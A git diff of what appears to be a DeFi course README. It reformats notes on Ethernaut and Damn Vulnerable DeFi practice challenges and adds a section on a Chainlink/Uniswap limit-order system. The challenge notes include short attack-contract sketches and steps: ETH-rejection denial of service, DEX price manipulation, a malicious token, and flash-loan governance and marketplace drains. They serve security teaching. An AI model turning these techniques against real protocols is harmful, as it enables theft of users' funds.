@@ -377,7 +377,6 @@ contract String {
 }
 ```
 
-
 ### Module 11: Transactions and MultSig Wallet
 
 This module covers the basics of transactions and Multisig Wallets. The deliverables for this assignment is to build a
@@ -400,15 +399,16 @@ npm run dev
 
 Finally, navigate to the host address provided in the terminal.
 
-
 ### Module 12: DeFi Security Challenges
 
 #### Overview
+
 This module covers key DeFi security concepts through Ethernaut and Damn Vulnerable DeFi challenges.
 
 #### Ethernaut Challenges
 
 ###### Challenge 9: King
+
 **Vulnerability**: Denial of Service through ETH rejection
 
 ```solidity
@@ -419,20 +419,23 @@ contract KingAttack {
     }
 
     receive() external payable {
-        revert("Cannot be king"); 
+        revert("Cannot be king");
     }
 }
 ```
 
 **Key Learning**:
+
 - Smart contracts can prevent others from becoming king by reverting ETH transfers
 - Always validate assumptions about ETH transfers
 - Consider fallback function implications
 
 ###### Challenge 22: Dex
+
 **Vulnerability**: Price manipulation through balance ratios
 
 **Attack Sequence**:
+
 1. Swap 10 token1 → token2
 2. Swap 20 token2 → token1
 3. Swap 24 token1 → token2
@@ -441,17 +444,20 @@ contract KingAttack {
 6. Swap 45 token2 → token1
 
 **Price Formula Exploited**:
+
 ```solidity
-price = (amount * IERC20(to).balanceOf(address(this))) 
-        / IERC20(from).balanceOf(address(this))
+price = (amount * IERC20(to).balanceOf(address(this)))
+    / IERC20(from).balanceOf(address(this))
 ```
 
 **Key Learning**:
+
 - Balance-based pricing is vulnerable to manipulation
 - Small trades can significantly impact exchange rates
 - Need price oracles or time-weighted average prices
 
 ###### Challenge 23: DexTwo
+
 **Vulnerability**: Missing token validation in swap function
 
 ```solidity
@@ -464,6 +470,7 @@ contract MaliciousToken {
 ```
 
 **Key Learning**:
+
 - Always validate input tokens
 - Whitelist approved tokens
 - Check token interfaces and behavior
@@ -471,6 +478,7 @@ contract MaliciousToken {
 ##### Damn Vulnerable DeFi
 
 ###### Free Rider Challenge
+
 **Vulnerability**: NFT marketplace price validation bypass + flash loan exploitation
 
 ```solidity
@@ -478,13 +486,13 @@ contract FreeRiderAttack {
     function attack() external {
         // 1. Flash loan WETH from Uniswap
         uniswapPair.swap(NFT_PRICE, 0, address(this), "flashloan");
-        
+
         // 2. Purchase NFTs at exploited price
         marketplace.buyMany{value: NFT_PRICE}(tokenIds);
-        
+
         // 3. Collect bounty
         transferNFTs(recovery);
-        
+
         // 4. Repay flash loan with fees
         repayFlashLoan();
     }
@@ -492,11 +500,13 @@ contract FreeRiderAttack {
 ```
 
 **Key Learning**:
+
 - Validate marketplace prices
 - Consider flash loan impact
 - Implement proper access controls
 
 ###### Selfie Challenge
+
 **Vulnerability**: Governance manipulation via flash loans
 
 ```solidity
@@ -504,16 +514,16 @@ contract SelfieAttack {
     function attack() external {
         // 1. Flash loan governance tokens
         pool.flashLoan(amount);
-        
+
         // 2. Create governance snapshot
         token.snapshot();
-        
+
         // 3. Queue malicious proposal
         governance.queueAction(
             address(pool),
             abi.encodeWithSignature("drainFunds()")
         );
-        
+
         // 4. Wait timelock
         // 5. Execute drain
         governance.executeAction(actionId);
@@ -522,7 +532,51 @@ contract SelfieAttack {
 ```
 
 **Key Learning**:
+
 - Flash loans can manipulate governance
 - Implement voting delays
 - Consider token borrowing in voting power
 
+# Module 13-14: Modern Smart Contract Tools
+
+This module introduces a decentralized limit order system built with modern smart contract tools. Users can set limit
+orders via a SvelteKit 5 frontend, and orders are managed through Solidity contracts. Real-time price feeds from
+Chainlink, automated monitoring with OpenZeppelin Defender, and Uniswap integration enable seamless, trustless order
+execution. Indexed with The Graph, order data is easily queryable for complete transparency.
+
+Key Highlights:
+
+* Automated Trading: Limit orders execute automatically when market conditions are met.
+* Reliable Price Feeds: Real-time data from Chainlink ensures accurate triggering.
+* DEX Integration: Uniswap is used to swap tokens instantly.
+* Efficient Data Management: Order history and statuses are indexed using The Graph.
+* Tested and Secure: Validated on Tenderly testnet with comprehensive Smock tests.
+
+```mermaid
+sequenceDiagram
+    participant User
+    participant Frontend
+    participant OrderContract
+    participant Chainlink
+    participant Defender
+    participant Uniswap
+    participant TheGraph
+
+    User->>Frontend: Create order
+    Frontend->>OrderContract: Submit order
+    OrderContract->>TheGraph: Index order
+    loop Price Check
+        Defender->>Chainlink: Get price
+        Chainlink-->>Defender: Return price
+        Defender->>OrderContract: Check orders
+        alt Price matches
+            OrderContract->>Uniswap: Execute swap
+            Uniswap-->>OrderContract: Return result
+            OrderContract->>TheGraph: Update status
+        end
+    end
+    User->>Frontend: View order history
+    Frontend->>TheGraph: Query orders
+    TheGraph-->>Frontend: Return data
+```
+This module deepens the practical skills in building secure, automated DeFi applications using the latest tools and technologies.
